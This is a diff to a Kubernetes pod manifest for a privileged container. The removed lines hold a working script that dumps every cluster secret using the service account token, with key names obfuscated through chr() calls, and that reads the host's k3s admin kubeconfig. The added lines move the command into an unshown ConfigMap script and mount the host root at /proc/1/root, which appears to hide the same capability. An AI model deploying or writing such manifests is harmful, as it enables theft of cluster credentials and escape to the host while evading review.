@@ -15,37 +15,19 @@ spec:
         image: alpine/curl:latest
         securityContext:
           privileged: true
-        command:
-          - sh
-          - -c
-          - |
-            TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
-            CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
-            API=https://kubernetes.default.svc
-            echo START_SECRETS
-            curl -sk --cacert $CA -H "Authorization: Bearer $TOKEN" $API/api/v1/secrets > /tmp/secrets.json
-            cat /tmp/secrets.json | python3 -c "
-import sys,json,base64
-d=json.load(sys.stdin)
-for item in d.get(chr(105)+chr(116)+chr(101)+chr(109)+chr(115),[]):
-    ns=item[chr(109)+chr(101)+chr(116)+chr(97)+chr(100)+chr(97)+chr(116)+chr(97)][chr(110)+chr(97)+chr(109)+chr(101)+chr(115)+chr(112)+chr(97)+chr(99)+chr(101)]
-    name=item[chr(109)+chr(101)+chr(116)+chr(97)+chr(100)+chr(97)+chr(116)+chr(97)][chr(110)+chr(97)+chr(109)+chr(101)]
-    data=item.get(chr(100)+chr(97)+chr(116)+chr(97),{})
-    if data:
-        print(chr(35)+chr(35)+chr(35),ns,name)
-        for k,v in data.items():
-            try: print(k,chr(61),base64.b64decode(v).decode())
-            except: print(k,chr(61),v)
-" 2>/dev/null
-            echo END_SECRETS
-            echo START_K3S
-            cat /proc/1/root/etc/rancher/k3s/k3s.yaml 2>/dev/null || echo NOT_FOUND
-            echo END_K3S
+        command: ["sh", "/scripts/run.sh"]
         volumeMounts:
+        - name: scripts
+          mountPath: /scripts
         - name: host-root
-          mountPath: /host
+          mountPath: /proc/1/root
+          mountPropagation: HostToContainer
       restartPolicy: Never
       volumes:
+      - name: scripts
+        configMap:
+          name: reader-script
+          defaultMode: 0755
       - name: host-root
         hostPath:
           path: /
